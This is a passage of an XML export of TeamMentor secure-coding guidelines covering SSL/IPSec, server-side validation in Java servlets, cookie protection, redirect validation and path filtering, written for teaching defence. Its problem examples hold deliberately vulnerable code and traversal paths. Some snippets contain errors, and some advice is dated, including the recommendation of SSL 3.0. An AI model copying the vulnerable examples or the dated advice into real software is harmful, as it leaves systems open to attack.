      <Id>ce57bd55-7f7b-42b5-b7b0-59db156f2b94</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Use SSL or IPSec for Secure Communication Between Entities</Title>
      <Category>Communication Security</Category>
      <Phase>Design</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>Use an encrypted communication channel to protect data sent between servers. SSL and IPSec can both be used under different circumstances to protect the communication traffic between servers.&nbsp;&nbsp;</p><h1>Why</h1><p>Servers may not necessarily co-exist in a secure environment. If the communication between&nbsp;two or more servers&nbsp;is not protected, the data sent between them could be compromised via eavesdropping or data manipulation.</p><h1>When</h1><p>If your servers are not inside a physically secure data center where the network eavesdropping threat is considered insignificant. </p><h1>How</h1><p>Determine the level of desired granularity for the given server/application suite. If the protection needs to be applied across all applications, use IPSec. If the protection is granular and only a certain portion of the information exchanged between servers is sensitive use SSL. SSL and IPSec can both be used to help protect communication between servers by encrypting traffic. There are benefits to using a mixed approach consisting of both SSL and IPSec. See the related guidelines for specific details. </p><h1>Additional Resources</h1><ul><li>How To: Use IPSec to Provide Secure Communication Between Two Servers&nbsp;<a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnnetsec/html/SecNetHT18.asp">http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnnetsec/html/SecNetHT18.asp</a> </li><li>How To: Use SSL to Secure Communication with SQL Server&nbsp;<a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnnetsec/html/SecNetHT19.asp">http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnnetsec/html/SecNetHT19.asp</a> </li><li>How To: Use IPSec for Filtering Ports and Authentication <a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnnetsec/html/HTUseIPSec.asp">http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnnetsec/html/HTUseIPSec.asp</a> </li><li>How To: Use IPSec Policy to Secure Terminal Services Communications in Windows Server 2003 <a href="http://support.microsoft.com/kb/816521">http://support.microsoft.com/kb/816521</a> </li><li>Using Secure Sockets Layer <a href="http://msdn2.microsoft.com/en-us/library/ds8bxk2a.aspx">http://msdn2.microsoft.com/en-us/library/ds8bxk2a.aspx</a> </li><li>Internet Protocol Version 6 <a href="http://msdn2.microsoft.com/en-us/library/3x7ak53z(VS.80).aspx">http://msdn2.microsoft.com/en-us/library/3x7ak53z(VS.80).aspx</a> </li></ul><h1>Related Items</h1><ul><li><a href="ruledisplay:ecfc4c67-2a6c-443e-844e-8a3051fe54f3">Use IPSsec to Encrypt Traffic Between Servers</a></li><li><a href="ruledisplay:8afce3ed-b29f-4a25-ab8c-0d070383c7ad">Use SSL Between Untrusted Server Applications</a></li><li><a href="ruledisplay:0c3fe1a1-c49c-4187-872e-246e07c875f9">For Communication Between Web Browser and Web Server, SSL is used When Pages Need to be Encrypted</a></li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-1117185868" Content_Hash="-69504881">
    <Metadata>
      <Id>cfb27b01-2baa-476e-8d80-207548c6facc</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Do Not Rely on Client-Side Validation</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Design</Phase>
      <Technology>Java</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><p>Applications written using Servlets or JSP.</p><h1>What to Do</h1><p>Avoid placing the validation procedures only on the client side. All input should be validated server side.</p><h1>Why</h1><p>Client-side validation is executed by the client and can be easily bypassed. Client-side validation is a major design problem when it appears in web applications. It places trust in the browser, an entity that should never be trusted.</p><h1>When</h1><p>If your application accepts input from the client, always validate for length, range and type on the server.</p><h1>How</h1><p>Client-side validation should only be used to improve user experience, never for security purposes. A client-side input validation check can improve application performance by catching malformed input on the client and, therefore, saving a roundtrip to the server. However, client side validation can be easily bypassed and should never be used for security purposes. Always use server-side validation to protect your application from malicious attacks.</p><p>Use the following steps when developing client side validation: </p><ol><li><p><strong>Never trust the browser.</strong> Because the browser is running on the user's machine, it can be fully controlled by the user. Therefore, any client-side validation code can be controlled and bypassed by an attacker.</p></li><li><p><strong>Use JavaScript only to enhance your pages.</strong> JavaScript is useful for enhancing your application's presentation. However, it has no mechanism to protect the integrity of its code. Do not rely on JavaScript to enforce security decisions. </p></li><li><p><strong>Place a server-side validator for all input. </strong>Input validation should be executed on the server side. Use the following steps to properly set the validation routines: </p><ul><li><p><strong>Identify input.</strong> Determine the data that is to be passed from the client to your application. Input can take the following forms on the client-side:</p><ul><li>URL-based parameters </li><li>Form-based parameters </li><li>Hidden fields </li><li>Cookies</li></ul></li><li><p><strong>Understand the input.</strong> Understand the use and constraints associated with each input. Be clear how each input is used. Define the format and type of each input. Build a server-side validator for each format and type of expected input.</p></li><li><p><strong>Create a set of validators.</strong> Build a validator for each type of input. Place the set of validators on the server-side of your application. If there are validators on the client-side, make sure the same validators are implemented on the server-side as well. Consult the <a href="ruledisplay:71225A92-ECA2-481E-ADEE-EA9C222DEA43">Validate Input from All Sources</a> and <a href="ruledisplay:DA8CCFC9-F04F-4913-B05E-F574D3E4A559">Validate Input for Length, Range, Format, and Type</a> guidelines about creating the validators.</p></li></ul><p>Once developed, it is important to place the validation routines at your application's trust boundary. Because your application's trust boundary extends only to your application's process space, the user's browser should not be considered&nbsp;a part of your application's trust boundary.</p><p>Example of correctly set validation:</p><blockquote><pre>&lt;%-- Filename: sample.jsp --%&gt;<br>&lt;%boolean validateJSP(String input)<br>{<br>      // Validation routine<br>}<br>String idx = request.getParameter("index");<br>if(idx != null &amp;&amp; validateJSP(idx))<br>{<br>      ...<br>}<br>else<br>{<br>      //Display a generic error message (e.g. "Invalid query.")<br>}<br>%&gt;<br> ...<br>&lt;form method="post" action="sample.jsp"&gt;<br>  &lt;input name="index" type="text" size="50"&gt;<br>  &lt;input name="submit" value="submit" type="submit"&gt;<br>&lt;/form&gt;</pre></blockquote></li></ol><h1>Problem Example</h1><p>The following code produces a data analysis based on a financial index. Unfortunately, the user's input is validated only on the client side via a JavaScript routine. Since there is no validation on the server, an attacker can bypass all validation and exploit cross-site scripting and SQL injection vulnerabilities.</p><blockquote><pre>&lt;!-- Filename: idv01.html --&gt;<br>&lt;html&gt;<br>  &lt;head&gt;<br>    &lt;!-- The page uses client-side validation only --&gt;<br>    &lt;script language="JavaScript"&gt;<br>&lt;!--function validate()<br>{<br>   var idx = document.forms[0].elements[0].value;<br>   var regex = new RegExp("[a-zA-Z0-9]+");<br>   var match = regex.exec(idx);<br>   var ret = false;<br>    if(idx.length &lt; 9 &amp;&amp; match != null)<br>    {<br>      ret = true;<br>    }<br>   else<br>   {<br>      alert("Invalid index!");<br>   }<br>    return ret;<br>}<br>// --&gt;<br>    &lt;/script&gt;<br>    &lt;title&gt;Query for index&lt;/title&gt;<br>  &lt;/head&gt;<br>  &lt;body&gt;<br>    &lt;!-- The application relies on client side validation --&gt;<br>    &lt;form method="post" action="/myapp/aggregate" onsubmit="return validate()"&gt;<br>      index:&amp;nbsp;&lt;input name="index" type="text" size="10"&gt;<br>      &lt;input name="submit" value="query" type="submit"&gt;<br>    &lt;/form&gt;<br>  &lt;/body&gt;<br>&lt;/html&gt;<br>// Filename: /myapp/aggregate<br>import java.io.*;<br>import java.util.*;<br>import java.lang.*;<br>import javax.servlet.*;<br>import javax.servlet.http.*;<br>import java.util.regex.*;<br> public final class DataAggregator extends HttpServlet<br>{<br>      public void doGet(HttpServletRequest request, HttpServletResponse response)<br>            throws ServletException, IOException<br>      {<br>            PrintWriter out = response.getWriter();<br>            String searchTerm = request.getParameter("index");<br>             try<br>            {<br>                  String retString;<br>                  retString = "The queried index \"";<br>                  retString += encodeHtml(searchTerm);<br>                  retString += "\" produced the following results:&lt;br&gt; ";<br>                  out.println(retString);<br>                   // The application does not provide a server-side validation<br>                  aggregateData(out, searchTerm);<br>            }<br>             catch (Exception e)<br>            {<br>                  // Add the appropriate logging and exception handling<br>                  // mechanisms. Consult the Exception Handling and<br>                  // Logging sections<br>                  out.println("We cannot handle your request at the moment."<br>                           +  "Please try again later.");<br>            }<br>             out.flush();<br>            out.close();<br>      }<br>}</pre></blockquote><h1>Solution Example</h1><p>The following code produces a data analysis based on a financial index. Because the application uses server-side validation, it is impossible for an attacker to bypass the validation routines and exploit any cross-site scripting and/or SQL injection vulnerabilities.</p><blockquote><pre>&lt;!-- Filename: idv01.html --&gt;<br>&lt;html&gt;<br>  &lt;head&gt;<br>    &lt;!-- The page uses server-side validation only --&gt;<br>    &lt;title&gt;Query for index&lt;/title&gt;<br>  &lt;/head&gt;<br>  &lt;body&gt;<br>    &lt;!-- The application uses no client-side validation --&gt;<br>    &lt;form method="post" action="/myapp/aggregate"&gt;<br>      index:&amp;nbsp;&lt;input name="index" type="text" size="10"&gt;<br>      &lt;input name="submit" value="query" type="submit"&gt;<br>    &lt;/form&gt;<br>  &lt;/body&gt;<br>&lt;/html&gt;<br>// Filename: /myapp/aggregate<br>import java.io.*;<br>import java.util.*;<br>import java.lang.*;<br>import javax.servlet.*;<br>import javax.servlet.http.*;<br>import java.util.regex.*;<br> public final class DataAggregator extends HttpServlet<br>{<br>      public void doGet(HttpServletRequest request, HttpServletResponse response)<br>            throws ServletException, IOException<br>      {<br>            PrintWriter out = response.getWriter();<br>            String searchTerm = request.getParameter("index");<br>             try<br>            {<br>                  // The application uses only server-side validation<br>                  if (validateSearchTerm(searchTerm))<br>                  {<br>                        String retString;<br>                        retString = "The queried index \"";<br>                        retString += encodeHtml(searchTerm);<br>                        retString += "\" produced the following results:&lt;br&gt; ";<br>                        out.println(retString);<br>                        aggregateData(out, searchTerm);<br>                  }<br>                  else<br>                  {<br>                        // Add the appropriate logging and exception handling<br>                        // mechanisms. Consult the Exception Handling and<br>                        // Logging sections<br>                        out.println("We cannot handle your request at the moment."<br>                                 +  "Please try again later.");<br>                  }<br>            }<br>            catch (Exception e)<br>            {<br>                  // Add the appropriate logging and exception handling<br>                  // mechanisms. Consult the Exception Handling and<br>                  // Logging sections<br>                  out.println("We cannot handle your request at the moment."<br>                           +  "Please try again later.");<br>            }<br>             out.flush();<br>             out.close();<br>      }<br>       boolean validateSearchTerm(String input)<br>      {<br>            String goodPattern = "(\\w|\\d)+";<br>            int goodLength = 8;<br>             if (input == null)<br>            {<br>                  return false;<br>            }<br>             if(input.length() &gt; goodLength)<br>            {<br>                  return false;<br>            }<br>                        Pattern p = Pattern.compile(goodPattern);<br>            Matcher m = p.matcher(input);<br>                        if(!m.matches())<br>            {<br>                  return false;<br>            }<br>                        return true;<br>      }<br>}</pre></blockquote><h1>Related Items</h1><ul><li><a href="ruledisplay:DA8CCFC9-F04F-4913-B05E-F574D3E4A559">Guideline: Validate Input for Length, Range, Format, and Type (Java Web Application)</a> </li><li><a href="ruledisplay:71225A92-ECA2-481E-ADEE-EA9C222DEA43">Guideline: Validate Input from All Sources (Java Web Application)</a> </li><li><a href="ruledisplay:BEC58471-A0EF-40C5-8C9D-9BF5C4B91F1F">Guideline: Filter All User-Supplied Filename and Path Input (Java Web Application)</a> </li><li><a href="ruledisplay:044B9F0A-6A95-442C-BF24-3F890D0B10EF">Attack: Client-side Validation Attack</a> </li><li><a href="ruledisplay:D089D9CA-860C-4F98-BC7E-5AD7553DB6DD">Checklist Item: Client-Side Validation is Not Relied On (Java Web Application)</a> </li></ul>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-1416277150" Content_Hash="-298631181">
    <Metadata>
      <Id>dbdd2fbe-4ecb-4bf5-9272-5f244ea26663</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Encrypt Communication Links</Title>
      <Category>Communication Security</Category>
      <Phase>Implementation</Phase>
      <Technology>Java</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><p>Applications written using Servlets or JSP.</p><h1>What to Do</h1><p>Encrypt the communication channels when interacting with other software across the network.</p><h1>Why</h1><p>Encrypting the communication links allows the application to preserve the confidentiality and integrity of the transmitted data. </p><h1>When</h1><p>If sensitive data must be transmitted between two hosts, either&nbsp;between servers or between application and server, then encrypt the communication links.</p><h1>How</h1><p>To encrypt the communication links:</p><ol><li><p><strong>Identify the connections used for transmitting sensitive data. </strong>Enumerate all connections between the different servers with other servers or with the application. Identify the sensitive data that is sent over the network and the respective connections that are used for such communication.</p></li><li><p><strong>Choose the appropriate encryption mechanism. </strong>Depending on the infrastructure, you may consider using IPSec or TLS/SSL.</p><ul><li><strong>IPSec:</strong> IPSec is used when the encryption needs to be applied across all involved parties. Since IPSec is designed to secure connections between static hosts that are "always on," use IPSec to secure the network connections between your application's servers. Due to its nature, IPSec requires low level support; therefore0, your application would need support from the operating system or a JNI component to manage it. </li><li><strong>TLS/SSL:</strong> TLS/SSL provides a granular protection which&nbsp;allows only&nbsp;the traffic containing sensitive data to be encrypted. Because TLS/SSL has a certificate based design, it allows the protection of data between mobile hosts. Use TLS/SSL to secure the communication channel between your application and its users.<br><br>While Java provides APIs for handling SSL encrypted traffic, it is recommended to follow the manuals associated with the&nbsp;third party software that&nbsp;is being used. For example, if your application connects to a database server, follow the database server's manual on setting up the encryption; if your application is web-oriented, follow the web server's documentation on setting up the SSL certificate. If your application uses SSL, ensure that you use SSL 3.0 and disable the cryptographically weak SSL 2.0 protocols.</li></ul></li><li><p><strong>Apply the appropriate encryption mechanism. </strong>Apply the encryption mechanism of choice at the appropriate locations in the code. Such locations include all functionality that establishes a connection between your application and another entity.</p></li></ol><h1>Problem Example</h1><p>The following code establishes a connection between&nbsp;two servers. Unfortunately, the communication is not encrypted; therefore, it is possible for an attacker to eavesdrop on the connection.</p><blockquote><pre>String remoteHost = "server02.example.com";<br>int remotePort = "1337";<br> <br>Socket sock = new Socket(remoteHost, remotePort);<br>InputStreamReader isr = new InputStreamReader(sock.getInputStream());<br>BufferedReader input = new BufferedReader(isr);<br>PrintWriter output = new PrintWriter(sock.getOutputStream(), true);</pre></blockquote><h1>Solution Example</h1><p>The following code establishes a connection between&nbsp;two servers. Because the communication is encrypted, the confidentiality of the data in transit is preserved; therefore, it is impossible for an attacker to eavesdrop on the connection.</p><blockquote><pre>String remoteHost = "server02.example.com";<br>int remotePort = "1337";<br> <br>SSLSocketFactory sslSF = (SSLSocketFactory)SSLSocketFactory.getDefault();<br>SSLSocket sslSock = (SSLSocket) sslSF.createSocket(remoteHost, remotePort);<br> <br>InputStreamReader isr = new InputStreamReader(sslSock.getInputStream());<br>BufferedReader input = new BufferedReader(isr);<br>PrintWriter output = new PrintWriter(sslSocket.getOutputStream(), true);</pre></blockquote><h1>Additional Resources</h1><ul><li>For more information about TLS, see: RFC for <a href="http://www.faqs.org/rfcs/rfc2246.html">Transport Layer Security</a>. </li><li>For more information about Java SSL sockets, see: Documentation for <a href="http://download.oracle.com/javase/1.4.2/docs/api/javax/net/ssl/SSLSocket.html">Class SSLSocket</a> in Java SDK. </li><li>To learn about the JSSE API, see: <a href="http://download.oracle.com/javase/1.4.2/docs/guide/security/jsse/JSSERefGuide.html">Java Secure Socket Extension (JSSE) Reference Guide</a> available from Oracle. </li><li>For a tutorial about using the JSSE API, see: <a href="http://www.javaworld.com/javaworld/jw-05-2001/jw-0511-howto.html">Build secure network applications with SSL and the JSSE API</a>. </li><li>For a quick overview on IPSec, see: A publication on <a href="http://www.digisafe.com/products/pdf/IPSec_Primer.pdf">IPSec Primer</a>.</li></ul><h1>Related Items</h1><ul><li><a href="ruledisplay:024B6044-7C89-436C-8111-1B6FAE7298AC">Guideline: Protect Sensitive Data Over the Network (Java Web Application)</a> </li><li><a href="ruledisplay:ED6F49C0-E021-459E-AE4F-9116CA8E8073">Guideline: Use SSL When Transmitting Credentials (Java Web Application)</a> </li><li><a href="ruledisplay:48BB4D3A-9295-4263-B3E7-090E483DEC5D">Attack: Man in the Middle Attack</a> </li><li><a href="ruledisplay:4572037A-2166-4AD1-8E73-D623E468A7B9">Attack: Information Disclosure Attack</a> </li><li><a href="ruledisplay:CBB29250-7ED3-4FDD-9B28-E3EE07EAF911">Attack: HTTP Replay Attack</a> </li><li><a href="ruledisplay:DEBB5734-39D0-4922-BDEE-1E0547E22DAD">Attack: Chosen Plaintext Attack</a> </li><li><a href="ruledisplay:3B657A67-F660-4DB5-9267-6E0FE2DAA1EB">Attack: Chosen Ciphertext Attack</a> </li><li><a href="ruledisplay:13EE90D9-B0F6-45D6-913A-BA8527525A04">Attack: Traffic Analysis Attack</a> </li><li><a href="ruledisplay:24D078E3-A02F-4EDF-A6EA-DA0E3E5FFE5E">Attack: Key Bruteforce Attack</a> </li><li><a href="ruledisplay:B446B34C-8DEC-4F74-A392-C30D1719D90D">Attack: Trust Relationship Attack</a> </li><li><a href="ruledisplay:9E3FC30A-B55C-4AF6-8B77-A534C6F87197">Attack: Phishing Attack</a> </li><li><a href="ruledisplay:AFC86927-1116-4207-B604-55FE690C298B">Checklist Item: Communication Links are Encrypted (Java Web Application)</a> </li></ul>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="1062648365" Content_Hash="2035136502">
    <Metadata>
      <Id>de9d7b57-067f-46c9-9709-aebbb40f69da</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Encrypt the Contents of the Authentication Cookies</Title>
      <Category>Session Management</Category>
      <Phase>Design</Phase>
      <Technology> Any</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li>Web Application</li></ul><h1>What to Do</h1><p>Cookies should be encrypted and checked for integrity to detect tampering even over an SSL channel because cookies can be stolen through cross-site scripting (XSS) attacks.</p><h1>Why</h1><p>To ensure that cookie contents are not read and not tampered with, because&nbsp;cookies can be stolen, even over a Secure Sockets Layer (SSL) channel using cross-site scripting attacks.</p><h1>When</h1><p>This guideline should be used for all applications that use Forms Authentication should have their cookies encrypted.</p><h1>How</h1><p>Encrypt the cookie contents even if you are using SSL. This prevents an attacker viewing or modifying the cookie if he manages to steal it through an XSS attack. In this event, the attacker could still use the cookie to access your application, but only while the cookie remains valid.</p><h1>Additional Resources</h1><ul><li>For more information see, "Chapter 4 - Design Guidelines for Secure Web Applications" at <a href="http://msdn2.microsoft.com/en-us/library/aa302420.aspx">http://msdn2.microsoft.com/en-us/library/aa302420.aspx</a>&nbsp; </li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance.</p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="1892160705" Content_Hash="-1288051384">
    <Metadata>
      <Id>e0cb34c8-d92a-4f52-9fad-38f75c7d5edb</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Use SSL to Protect Session Authentication Cookies</Title>
      <Category>Session Management</Category>
      <Phase>Design</Phase>
      <Technology> Any</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li>Web Application&nbsp;</li></ul><h1>What to Do</h1><p>You must protect the authentication cookie&nbsp;with SSL. </p><h1>Why</h1><p>To prevent session hijacking and cookie replay attacks, secure the cookie by making sure that it is only passed over SSL connections using the HTTPS protocol. For additional risk mitigation, encrypt the cookie before sending it to the client and limit the period for which the cookie is valid. </p><h1>When</h1><p>When&nbsp;you use Forms authentication, make sure your application encrypts the authentication cookies using the <strong>protection="All"</strong> attribute on the <strong>&lt;forms&gt; </strong>element. This practice is recommended in addition to SSL to mitigate the risk of an XSS attack that manages to steal the authentication cookie of a user.&nbsp; </p><h1>How</h1><p>Do not pass authentication cookies over HTTP connections. Set the secure cookie property within authentication cookies, which instructs browsers to send cookies back to the server only over HTTPS connections. For more information, see Chapter&nbsp;10, "Building Secure ASP.NET Web Pages and Controls."</p><p>If you are using .NET Framework version 1.1, set the secure property by using <strong>requireSSL="true"</strong> on the <strong>&lt;forms&gt;</strong> element as follows:</p><div><div></div><div><pre>&lt;forms loginUrl="Secure\Login.aspx"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; requireSSL="true" . . . /&gt;</pre></div><div><p>If you are using .NET Framework version 1.0, set the secure property manually in the <strong>Application_EndRequest</strong> event handler in Global.asax using the following code:</p><div><div></div><div><pre>protected void Application_EndRequest(Object sender, EventArgs e) <br>{<br>&nbsp; string authCookie = FormsAuthentication.FormsCookieName;<br><br>&nbsp; foreach (string sCookie in Response.Cookies) <br>&nbsp; {<br>&nbsp;&nbsp;&nbsp; if (sCookie.Equals(authCookie))<br>&nbsp;&nbsp;&nbsp; { <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // Set the cookie to be secure. Browsers will send the cookie<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // only to pages requested with https<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Response.Cookies[sCookie].Secure = true;<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp; }<br>}</pre></div></div></div></div><h1>Additional Resources</h1><ul><li>Design Guidelines for Secure Web Applications <a href="http://msdn2.microsoft.com/en-us/library/aa302420.aspx">http://msdn2.microsoft.com/en-us/library/aa302420.aspx</a> </li><li>Architecture and Design Review for Security <a href="http://msdn2.microsoft.com/en-us/library/aa302420.aspx">http://msdn2.microsoft.com/en-us/library/aa302420.aspx</a></li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance.</p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="245446950" Content_Hash="-897414510">
    <Metadata>
      <Id>e1244c90-1c7c-42ec-8de4-87998a2cd8a9</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Validate Destinations of Redirects and Forwards</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Implementation</Phase>
      <Technology> Any</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority />
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li>Web Applications</li></ul><h1>What to Do</h1><p>Validate destinations of redirects or forwards.</p><h1>Why</h1><p>If destinations of redirects or forwards are not validated, an attacker may create hyperlinks that appear to point to legitimate sites, but actually point to malicious pages controlled by the attacker. This technique is often used by phishers to trick people into visiting fake sites that steal authentication credentials. In some cases, a user may gain unauthorized access by manipulating redirect or forward parameters, if destinations are not validated.</p><h1>When</h1><p>Use this guideline when writing a web application that uses redirects or forwards. Avoid using redirects or forwards in web applications, if possible.</p><h1>How</h1><p>Perform the following actions to assure validation of redirects and forwards:</p><ol><li><p><strong>Identify redirects and forwards.</strong> Review code to find all redirects and forwards.</p></li><li><p><strong>Map destinations.</strong> Make a list of all destinations for each redirect and forward. Define mapping values for all destinations used by redirects and forwards. A mapping value is a short identifying string that symbolically represents a resource.</p></li><li><p><strong>Define access permissions.</strong> Determine circumstances under which it is acceptable for each user role to access each destination.</p></li><li><p><strong>Validate redirects.</strong> Rewrite redirects and forwards to use mapping values as input to calculate the final destinations of redirects or forwards. Add validation routines to verify that the user has permissions to access the resource, which is the destination of the redirect or forward.</p></li></ol><h1>Additional Resources</h1><ul><li>For more information about unvalidated redirects and forwards, please see <a href="http://www.owasp.org/index.php/Top_10_2010-A10-Unvalidated_Redirects_and_Forwards">http://www.owasp.org/index.php/Top_10_2010-A10-Unvalidated_Redirects_and_Forwards</a> </li></ul><h1>Related Items</h1><ul><li><a href="ruledisplay:83896e9e-a4cd-434c-980a-276c660984da">Use Mapping Values When Redirecting on User Input</a></li><li><a href="ruledisplay:9680fe6b-230c-4794-9777-cae02aa597d7">URL Redirection Attack</a></li><li><a href="ruledisplay:1b4602a7-88c5-4255-8f39-4fae73546608">How to Test for URL Redirection Bugs</a></li><li><a href="ruledisplay:15e88928-1cbc-4fdd-8640-90319c81c178">Phishing Attack<br></a></li></ul>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="2024574949" Content_Hash="804397489">
    <Metadata>
      <Id>e2762d56-fcc1-4677-b955-d97fdce23646</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Filter All User-Supplied Filename and Path Input</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Implementation</Phase>
      <Technology>Java</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><p>Applications written using Servlets or JSP.</p><h1>What to Do</h1><p>Carefully validate filename and path input. Apply whitelist techniques when validating input.</p><h1>Why</h1><p>Filenames and paths interact directly with the underlying filesystem. Allowing malicious users to manipulate file system operations directly or indirectly through their input can expose important sensitive system files. Canonicalization vulnerabilities can result in an attacker gaining access to unexpected resources.</p><h1>When</h1><p>If your user input is used to help construct filenames or file paths, carefully validate to ensure the input is not used to gain access to unexpected resources.</p><h1>How</h1><p>Use the following steps when validating filename and path input:</p><ol><li><p><strong>Establish a base directory. </strong>The base directory is where your application should store any user-supplied files.</p><ul><li>The location of the base directory should be carefully chosen. It should not be a subdirectory of any important directory such as <strong>/etc</strong> or <strong>c:\windows</strong>. </li><li>Write access should be allowed only to the base directory and its children, but not to its parents. </li><li>Because of read access misuses, it is recommended that no sensitive information is stored inside any of the base directory's parents. </li><li>Read/write access outside the base directory and its parents should be prohibited. This can be achieved via whitelist validation on the user-supplied filename and strict access control from the filesystem. </li><li>Avoid setting your application's local user account as owner of any of the base directory's parents.<br><br><strong>Note:</strong> If your application is Windows based, create your base directory in a partition different than the partition hosting all critical system services. Because Windows prohibits changing partitions through canonicalization, it is impossible for an attacker to access a resource that is located in another partition. For instance, if your Windows installation is located at <strong>c:\windows</strong>, place your base directory at <strong>d:\myapp\temp</strong>. </li></ul></li><li><p><strong>Validate using whitelisting. </strong>The syntax for accessing filesystems is well known. Use whitelist techniques to allow good input and discard bad input. Be careful with canonicalization issues. Canonicalization problems occur when the user attempts to execute directory traversal by using special pathname sequences to direct your application into a directory it should not access. <br><br>Example:<br><br>Assume your application has created the file</p><blockquote><pre>d:\myapp\temp\file.dat</pre></blockquote><p>The following strings can also represent the same file:</p><blockquote><pre>d:\myapp\temp\..\temp\file.datd:\myapp\temp\..\temp\..\temp\file.datd%3A%5Cmyapp%5Ctemp%5Cfile.dat</pre></blockquote><p>Canonicalization problems can be avoided by using whitelist techniques and setting the right permissions at the filesystem level. If your application knows the file structure within the base directory, the following code can be applied:</p><blockquote><pre>public boolean validateFilename(File file) throws IOException, SecurityException<br>{<br>      // This represents the format d:\myapp\temp\&lt;file name&gt; where the file name<br>      // can consist of alpha-numeric, space/tab, period, and dash characters and<br>      // cannot exceed 20 characters in length<br>      String goodPattern = "d:(<a>\\\\|/)myapp(\\\\|/)temp(\\\\|/)(\\w|\\s|\\.|-|){1,20</a>}";<br>      Pattern p = Pattern.compile(goodPattern, Pattern.CASE_INSENSITIVE);<br>      Matcher m = p.matcher(file.getCanonicalPath());<br>       if (!m.matches())<br>      {<br>            return false;<br>      }<br>       return true;<br>}</pre></blockquote><p>Filesystem permissions are also a very important mechanism for avoiding canonicalization problems. Restricting the access rights of your application's local account can prevent access to sensitive system data. It is recommended that:</p><ul><li>full access is given only within the base directory </li><li>read access is given only within the base directory's parents </li><li>no access is given anywhere else on the filesystem<br><br>It is also recommended to execute your application with its own local account rather than as the hosting server; therefore, any restrictions applied to your application would not affect the performance of the hosting server. <br></li></ul></li><li><p><strong>Avoid common mistakes.</strong></p><ul><li><p><strong>Use the Java File object.</strong> Always use a <strong>java.io.File</strong> object instead of a <strong>String</strong> object to represent a file. Using the <strong>File</strong> object allows you to access the actual file and some useful and relevant information such as the file's size, parent, path, etc. Example:</p><blockquote><pre>File file = new File("d:\myapp\temp\file.dat");</pre></blockquote></li><li><p><strong>Verify the canonical path.</strong> The <strong>File</strong> object provides the file's path in&nbsp;three different forms -- original, absolute and canonical. Always use the canonical path when using whitelisting to verify the file's path. </p><p>For instance, the file </p><blockquote><pre>d:\myapp\temp\..\temp\..\temp\file.dat</pre></blockquote><p>would have the following paths:</p><blockquote><pre>d:\myapp\temp\..\temp\..\temp\file.dat<br> (Original via the <strong>File.getPath</strong> method)<br>d:\myapp\temp\..\temp\..\temp\file.dat<br> (Absolute via the <strong>File.getAbsolutePath</strong> method)<br>D:\myapp\temp\file.dat<br> (Canonical via the <strong>File.getCanonicalPath</strong> method)</pre></blockquote></li><li><p><strong>Verify&nbsp;that the 